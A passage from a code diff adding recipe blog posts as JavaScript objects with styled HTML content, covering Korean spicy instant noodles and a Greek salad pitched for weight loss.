+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Rice Bowl Recipe</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Meals</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Asian Cuisine</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Gochujang</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Vegetable Rice Bowl</span>
+<span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Korean Recipes</span>
+</div>
+
+                `
+            },
+            {
+                id: 'my-seosourein-post',
+                title: 'spicy noodles 🍜',
+                date: 'May 21, 2026',
+                image: './assets/spicy noodles 🍜.png',
+                excerpt: "Few comfort foods are as satisfying as a steaming bowl of spicy Korean-style noodles. Packed with bold flavors, chewy noodles, rich broth, and simple yet delicious toppings, this popular dish has become a favorite among food lovers worldwide. Whether you're looking for a quick weeknight meal, a satisfying late-night snack, or a budget-friendly comfort dish, Korean spicy noodles offer the perfect balance of heat, flavor, and convenience.",
+                content: `
+                <p>Few comfort foods are as satisfying as a steaming bowl of spicy Korean-style noodles. Packed with bold flavors, chewy noodles, rich broth, and simple yet delicious toppings, this popular dish has become a favorite among food lovers worldwide. Whether you're looking for a quick weeknight meal, a satisfying late-night snack, or a budget-friendly comfort dish, Korean spicy noodles offer the perfect balance of heat, flavor, and convenience.</p>
+
+<p>The beauty of this dish lies in its simplicity. With a handful of ingredients and minimal preparation, you can transform a packet of instant noodles into a restaurant-worthy bowl bursting with savory, spicy goodness. The addition of ingredients like egg, green onions, cabbage, soy sauce, and gochujang creates a richer and more authentic flavor profile that elevates the entire experience.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Korean spicy noodles are quick, affordable, and packed with flavor.</li>
+    <li>Gochujang adds authentic Korean heat and depth.</li>
+    <li>Simple ingredients can transform instant noodles into a complete meal.</li>
+    <li>Eggs, vegetables, and toppings improve nutrition and texture.</li>
+    <li>The recipe is highly customizable for different spice levels.</li>
+    <li>Perfect for busy weeknights, comfort food cravings, and easy lunches.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Korean Spicy Noodles Have Become So Popular</h2>
+
+<p>Korean cuisine has experienced remarkable global popularity in recent years, and spicy noodle dishes have played a significant role in that growth. Their appeal comes from a combination of convenience, bold flavors, and satisfying textures that make them stand out from traditional instant noodle meals.</p>
+
+<p>Unlike basic noodle soups, Korean-inspired spicy noodles often feature layers of flavor. The broth is typically enhanced with ingredients such as gochujang, soy sauce, garlic, and vegetables, creating a richer and more complex taste experience.</p>
+
+<p>Many people appreciate how versatile the dish can be. You can prepare it in just a few minutes while still achieving a homemade feel. That flexibility makes it ideal for students, busy professionals, and anyone seeking a quick meal without sacrificing flavor.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The secret to memorable Korean-style noodles is not simply the spice level. It is the balance between heat, umami, savory richness, and fresh toppings that creates a truly satisfying bowl.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Essential Ingredients for a Flavorful Bowl</h2>
+
+<p>One reason this recipe is so accessible is that it relies on ingredients commonly found in many kitchens. Each ingredient contributes something unique to the final result.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Instant Noodles</h3>
+
+<p>Instant noodles provide the foundation of the dish. Their chewy texture absorbs the spicy broth beautifully while keeping preparation time short.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Gochujang</h3>
+
+<p>Gochujang is a fermented Korean chili paste known for its rich, slightly sweet, and deeply savory flavor. It delivers more complexity than ordinary hot sauce and helps create an authentic Korean-inspired taste.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Egg</h3>
+
+<p>An egg adds protein and richness. When cooked directly in the broth, the yolk becomes creamy and helps soften the heat of the spicy sauce.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Vegetables</h3>
+
+<p>Cabbage and green onions introduce freshness, texture, and color. They also add nutritional value while complementing the spicy flavors.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Soy Sauce</h3>
+
+<p>A small amount of soy sauce enhances umami and rounds out the overall flavor profile without overpowering the dish.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Step-by-Step Preparation Guide</h2>
+
+<p>Preparing Korean spicy noodles requires very little effort, making it an excellent recipe for beginners.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 1: Boil the Water</h4>
+
+<p>Bring water to a gentle boil in a medium-sized pan. This forms the base for cooking the noodles and developing the broth.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 2: Cook the Noodles</h4>
+
+<p>Add the instant noodles and any included seasoning packets. Stir occasionally to prevent sticking and ensure even cooking.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 3: Add Vegetables</h4>
+
+<p>Introduce shredded cabbage and other vegetables while the noodles soften. This allows them to cook without becoming overly tender.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 4: Incorporate the Egg</h4>
+
+<p>Crack an egg directly into the simmering broth. Allow it to cook until it reaches your desired consistency.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 5: Stir in Gochujang</h4>
+
+<p>Add the chili paste and mix thoroughly. This step transforms the broth into a bold and flavorful sauce.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 6: Finish and Garnish</h4>
+
+<p>Top the finished bowl with chopped green onions and any additional toppings before serving immediately.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Adding gochujang near the end preserves its complex flavor.</li>
+    <li>Fresh green onions create contrast against the rich broth.</li>
+    <li>A runny egg yolk naturally enriches the sauce.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Creative Ways to Customize Korean Spicy Noodles</h2>
+
+<p>One of the most exciting aspects of this dish is how easily it can be customized. Small changes can create entirely new flavor experiences.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add More Protein</h3>
+
+<p>Chicken, beef, shrimp, tofu, or even leftover roasted meats can make the meal more filling and nutritious.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Increase the Vegetable Content</h3>
+
+<p>Spinach, mushrooms, carrots, bok choy, bean sprouts, and bell peppers pair wonderfully with spicy noodles.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Experiment with Toppings</h3>
+
+<p>Sesame seeds, seaweed flakes, chili oil, kimchi, and shredded cheese are popular additions that enhance flavor and texture.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> A small amount of shredded cheese can mellow the spice while adding a creamy texture that pairs surprisingly well with Korean-style noodles.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Balancing Spice and Flavor</h2>
+
+<p>Not everyone enjoys the same level of heat. Fortunately, spicy noodle recipes are easy to adjust according to personal preference.</p>
+
+<p>For a milder version, reduce the amount of gochujang and add extra broth. You can also include more vegetables or an additional egg to soften the spicy intensity.</p>
+
+<p>For those who enjoy fiery flavors, increase the chili paste, add chili flakes, or finish the dish with a drizzle of chili oil.</p>
+
+<p>The key is maintaining balance. Excessive heat can overpower the savory and umami notes that make Korean noodles so appealing.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Nutritional Benefits of Homemade Spicy Noodles</h2>
+
+<p>Although instant noodles are often viewed as a convenience food, thoughtful additions can significantly improve their nutritional profile.</p>
+
+<ul>
+<li>Eggs provide high-quality protein.</li>
+<li>Cabbage contributes fiber and vitamins.</li>
+<li>Green onions add antioxidants and freshness.</li>
+<li>Additional vegetables increase nutrient density.</li>
+<li>Homemade modifications allow better control over sodium levels.</li>
+</ul>
+
+<p>Making simple ingredient upgrades transforms a basic noodle packet into a more balanced and satisfying meal.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The easiest way to improve instant noodles is by treating them as a foundation rather than the finished meal. Fresh vegetables, protein, and flavorful toppings can dramatically enhance both nutrition and taste.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Common Mistakes to Avoid</h2>
+
+<p>Even a simple recipe can benefit from a few helpful tips.</p>
+
+<ol>
+<li>Overcooking the noodles until they become mushy.</li>
+<li>Adding too much seasoning without tasting first.</li>
+<li>Using excessive heat that overwhelms other flavors.</li>
+<li>Skipping fresh garnishes and toppings.</li>
+<li>Not stirring the gochujang thoroughly into the broth.</li>
+</ol>
+
+<p>Paying attention to these details ensures a more enjoyable and restaurant-quality result.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Perfect Occasions for Korean Spicy Noodles</h2>
+
+<p>This versatile dish fits a variety of situations. It is quick enough for busy workdays yet comforting enough for cozy evenings at home.</p>
+
+<ul>
+<li>Fast weeknight dinners</li>
+<li>Late-night comfort meals</li>
+<li>Budget-friendly lunches</li>
+<li>Student meals</li>
+<li>Cold-weather comfort food</li>
+<li>Quick homemade Korean-inspired recipes</li>
+</ul>
+
+<p>Its convenience and flavor make it a reliable option whenever you need a satisfying meal without extensive preparation.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Ready in minutes with simple ingredients.</li>
+    <li>Features bold Korean-inspired flavors.</li>
+    <li>Easy to customize with proteins and vegetables.</li>
+    <li>Suitable for various spice preferences.</li>
+    <li>Ideal comfort food for any season.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Korean spicy noodles combine convenience, comfort, and bold flavor in one satisfying bowl. With simple pantry ingredients and a few fresh additions, it is possible to create a meal that feels far more special than ordinary instant noodles. The rich heat of gochujang, the creaminess of a perfectly cooked egg, and the freshness of vegetables work together to deliver a memorable dining experience.</p>
+
+<p>Whether you are exploring Korean-inspired cuisine for the first time or searching for new ways to upgrade your favorite noodle recipes, this dish offers endless possibilities. Adjust the spice level, experiment with toppings, and make it your own. The result is a comforting meal that is quick to prepare, deeply flavorful, and always satisfying.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Korean Spicy Noodles</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Ramyeon Recipe</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Gochujang</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Korean Comfort Food</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Easy Noodle Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Instant Noodle Upgrade</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Asian Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Spicy Food Ideas</span>
+</div>
+
+                `
+            },
+            {
+                id: 'recipe-third-post',
+                title: 'Fresh Greek Salad for Healthy Weight Loss',
+                date: 'April 2, 2026',
+                image: './assets/Fresh Greek Salad for Healthy Weight Loss.png',
+                excerpt: 'Fresh, colorful, and packed with wholesome ingredients, Greek salad has earned its reputation as one of the healthiest and most satisfying meals in Mediterranean cuisine. Combining crisp vegetables, protein-rich ingredients, healthy fats, and vibrant flavors, this classic dish offers an ideal balance between nutrition and taste. Whether your goal is weight management, healthier eating habits, or simply enjoying a delicious meal, Greek salad is a timeless option that never disappoints.',
+                content: `
+                <p>Fresh, colorful, and packed with wholesome ingredients, Greek salad has earned its reputation as one of the healthiest and most satisfying meals in Mediterranean cuisine. Combining crisp vegetables, protein-rich ingredients, healthy fats, and vibrant flavors, this classic dish offers an ideal balance between nutrition and taste. Whether your goal is weight management, healthier eating habits, or simply enjoying a delicious meal, Greek salad is a timeless option that never disappoints.</p>
+
+<p>Unlike many restrictive diet foods that sacrifice flavor for fewer calories, a well-made Greek salad delivers freshness, texture, and satisfaction in every bite. The combination of juicy tomatoes, crunchy cucumbers, tangy feta cheese, savory olives, and lean protein creates a meal that feels indulgent while supporting healthy lifestyle goals.</p>
+
+<p>One of the reasons this Mediterranean favorite continues to grow in popularity is its simplicity. With just a handful of fresh ingredients and a light dressing, you can create a nutrient-rich meal in minutes. It is easy to prepare, highly customizable, and suitable for a wide variety of dietary preferences.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Greek salad is naturally rich in nutrients while remaining relatively low in calories.</li>
+    <li>Fresh vegetables provide fiber, vitamins, and hydration.</li>
+    <li>Healthy fats from olive oil and olives support balanced nutrition.</li>
+    <li>Protein-rich ingredients help increase satiety and support weight loss goals.</li>
+    <li>The recipe can be customized with additional vegetables, herbs, and proteins.</li>
+    <li>Perfect as a light lunch, dinner, or healthy meal prep option.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Greek Salad Is a Smart Choice for Weight Loss</h2>
+
+<p>Weight loss often becomes easier when meals are both nutritious and satisfying. Greek salad excels in this area because it combines high-volume vegetables with moderate amounts of protein and healthy fats. This balance helps keep hunger under control while delivering important nutrients.</p>
+
+<p>Fresh vegetables such as cucumbers, tomatoes, onions, and bell peppers provide bulk and fiber without contributing excessive calories. These ingredients help create a feeling of fullness that can reduce the temptation to snack between meals.</p>
+
+<p>Lean protein sources, such as grilled chicken, further enhance satiety. Protein takes longer to digest than simple carbohydrates, helping you stay satisfied for longer periods after eating.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Sustainable weight loss is not about eliminating entire food groups. Meals like Greek salad demonstrate how balanced portions of vegetables, protein, and healthy fats can work together to support long-term health goals.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Mediterranean Diet Connection</h2>
+
+<p>Greek salad is often associated with the Mediterranean diet, one of the most widely respected eating patterns in the world. This approach focuses on fresh vegetables, olive oil, herbs, legumes, lean proteins, and minimally processed foods.</p>
+
+<p>The Mediterranean lifestyle emphasizes enjoying real food rather than relying on highly processed products. Greek salad embodies this philosophy perfectly, showcasing fresh ingredients that are both nourishing and flavorful.</p>
+
+<p>Many people choose Mediterranean-inspired meals because they are practical, flexible, and easy to maintain over time. Rather than feeling restrictive, they encourage variety and enjoyment while promoting overall wellness.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">What Makes Mediterranean Meals So Appealing?</h3>
+
+<ul>
+<li>Focus on fresh ingredients.</li>
+<li>Natural sources of healthy fats.</li>
+<li>Abundant vegetables and herbs.</li>
+<li>Balanced protein intake.</li>
+<li>Simple preparation methods.</li>
+<li>Flavorful meals without excessive processing.</li>
+</ul>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Key Ingredients and Their Benefits</h2>
+
+<p>Every ingredient in a traditional Greek salad contributes something valuable to both flavor and nutrition.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Cherry Tomatoes</h3>
+
+<p>Cherry tomatoes bring natural sweetness, vibrant color, and a juicy texture. They are rich in vitamins and contribute freshness to the salad.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Cucumber</h3>
+
+<p>Cucumbers provide a refreshing crunch and high water content. Their mild flavor balances stronger ingredients such as olives and onions.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Red Onion</h3>
+
+<p>Thinly sliced red onions add a pleasant sharpness that enhances the overall flavor profile while contributing color and texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Red Bell Pepper</h3>
+
+<p>Bell peppers introduce sweetness and crunch while helping create a colorful and visually appealing presentation.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Kalamata Olives</h3>
+
+<p>Kalamata olives deliver a distinctive savory taste and provide healthy fats that contribute to satiety and flavor.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Feta Cheese</h3>
+
+<p>Feta cheese offers a creamy texture and tangy flavor that complements the fresh vegetables beautifully.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Grilled Chicken</h3>
+
+<p>Adding grilled chicken transforms Greek salad from a side dish into a complete meal by increasing its protein content.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Olive Oil and Oregano</h3>
+
+<p>Extra virgin olive oil and oregano are classic Mediterranean ingredients that enhance flavor while maintaining the salad's simplicity.</p>
+
+<div style="background:#f1f5f9;border:1px solid #cbd5e1;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why This Matters</h3>
+  <p style="margin:0;">Many healthy meals fail because they lack satisfaction. Greek salad succeeds because it combines freshness, texture, protein, and healthy fats in a way that keeps meals enjoyable while supporting healthy eating habits.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Build the Perfect Greek Salad</h2>
+
+<p>Creating an exceptional Greek salad starts with choosing the freshest ingredients available. Quality matters because each component plays a visible role in the final dish.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 1: Prepare the Vegetables</h4>
+
+<p>Wash and chop the tomatoes, cucumbers, peppers, and onions into bite-sized pieces. Consistent sizes help create a balanced texture.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 2: Add Protein</h4>
+
+<p>Slice grilled chicken into small pieces and distribute it evenly throughout the salad.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 3: Incorporate Feta and Olives</h4>
+
+<p>Scatter feta cheese and Kalamata olives over the top to create visual appeal and balanced flavor.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 4: Dress Lightly</h4>
+
+<p>Drizzle with olive oil and sprinkle with oregano, salt, and pepper.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Step 5: Finish with Citrus</h4>
+
+<p>A squeeze of fresh lemon juice brightens the flavors and enhances the freshness of every ingredient.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Add the dressing just before serving. This helps preserve the crisp texture of the vegetables and prevents the salad from becoming watery.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">High Protein Benefits of This Salad</h2>
+
+<p>Protein plays a crucial role in muscle maintenance, recovery, and appetite management. Including grilled chicken alongside feta cheese significantly boosts the protein content of the meal.</p>
+
+<p>For people focused on weight loss, higher-protein meals can help reduce cravings and improve overall satisfaction. This makes Greek salad a practical option for lunch or dinner.</p>
+
+<p>Those following active lifestyles often appreciate how easily the salad can be adapted to meet their protein requirements. Additional grilled chicken, turkey, shrimp, or plant-based proteins can be incorporated without compromising flavor.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Meal Prep and Busy Lifestyle Advantages</h2>
+
+<p>One of the biggest strengths of Greek salad is its convenience. Most ingredients can be prepared in advance, making meal planning easier throughout the week.</p>
+
+<ul>
+<li>Vegetables can be chopped ahead of time.</li>
+<li>Grilled chicken can be cooked in batches.</li>
+<li>Dressing ingredients are easy to store separately.</li>
+<li>The salad remains fresh when assembled shortly before eating.</li>
+</ul>
+
+<p>For professionals, students, and families with busy schedules, this makes Greek salad an excellent solution for maintaining healthy eating habits.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Successful healthy eating often depends on convenience. Preparing ingredients in advance removes barriers and makes nutritious choices easier during busy days.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Ways to Customize Your Greek Salad</h2>
+
+<p>Although traditional Greek salad is beloved for its simplicity, there are many ways to personalize the recipe.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add More Vegetables</h3>
+
+<p>Leafy greens, radishes, carrots, or avocado can add variety and texture.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Try Different Proteins</h3>
+
+<p>Grilled shrimp, salmon, chickpeas, tofu, or turkey can create new flavor combinations while maintaining nutritional balance.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Enhance the Flavor</h3>
+
+<p>Fresh herbs such as parsley, basil, or mint can add an extra layer of freshness and aroma.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Serving Suggestions</h2>
+
+<p>Greek salad is versatile enough to be enjoyed in several ways.</p>
+
+<ul>
+<li>Serve as a light lunch.</li>
+<li>Pair with grilled fish or chicken.</li>
+<li>Enjoy as a refreshing summer dinner.</li>
+<li>Include as part of a Mediterranean-inspired spread.</li>
+<li>Prepare individual portions for meal prep containers.</li>
+</ul>
+
+<p>The combination of freshness and simplicity makes it suitable for casual meals as well as special gatherings.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Points</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Rich in vegetables, protein, and healthy fats.</li>
+    <li>Supports healthy eating and weight management goals.</li>
+    <li>Easy to prepare in approximately 15 minutes.</li>
+    <li>Highly customizable for different dietary needs.</li>
+    <li>Perfect for meal prep and busy lifestyles.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+
+<p>Greek salad proves that healthy eating does not need to be complicated. By combining fresh vegetables, quality protein, flavorful feta cheese, heart-healthy olive oil, and aromatic herbs, this Mediterranean classic delivers both nutrition and satisfaction in every bite.</p>
+
+<p>Its versatility, quick preparation time, and balanced nutritional profile make it an excellent option for anyone seeking a healthier lifestyle. Whether you're focused on weight loss, meal prep, or simply enjoying delicious food made from wholesome ingredients, Greek salad deserves a permanent place in your recipe collection.</p>
+
+<p>With endless customization possibilities and naturally vibrant flavors, this refreshing dish continues to be one of the most practical and enjoyable healthy meals available today.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Greek Salad</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Weight Loss Recipes</span>
